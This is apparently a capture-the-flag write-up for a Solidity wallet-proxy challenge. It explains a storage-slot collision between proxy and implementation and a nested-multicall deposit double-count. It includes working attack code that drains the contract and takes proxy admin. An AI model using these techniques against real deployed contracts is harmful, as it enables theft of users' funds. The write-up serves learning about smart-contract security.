# 24-WalletAttack

1. To solve this challenge, you have to understand proxy contract concept : https://docs.openzeppelin.com/contracts/3.x/api/proxy#UpgradeableProxy

2. Proxy contract responsible for storage and delegatecall to the logic or implementation contract, the storage pointer at proxy and implementation contract must referencing to the same information. But you can see that in `PuzzleProxy` and `PuzzleWallet` the storage layout is referencing to different thing.

Storage at `PuzzleProxy` :

```solidity
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    ..
    }
```

Storage at `PuzzleWallet` :

```solidity
contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;
    ..
    }
```

3. First you call `proposeNewAdmin`, this will change `pendingAdmin` of `PuzzleProxy` and `owner` of `PuzzleWallet`

4. Now you are owner of `PuzzleWallet` and can call `addToWhitelist`, add your contract address or your EOA to this.

5. To change the owner of `PuzzleProxy`'s `admin`, we have to change `maxBalance` on `PuzzleWallet`, but to call `setMaxBalance` we have to somehow drain the contract balance. We can call `multicall` in `PuzzleWallet` with providing nested `multicall` array to bypass `deposit` checking. This way we can providing only `0.001 eth` but recorded as `0.002 eth`.

6. Drain the balance by call `execute` and call `setMaxBalance`.

```solidity
    function attack() external payable {
        //creating encoded function data
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(
            wallet.multicall.selector,
            depositSelector
        );

        //calling multicall with nested data stored above, value set to 0.001 eth
        wallet.multicall{value: msg.value}(nestedMulticall);
        //calling execute to drain the contract
        wallet.execute(msg.sender, 0.002 ether, "");
        //calling setMaxBalance with our address to become the admin of proxy
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        //making sure our exploit worked
    }
```
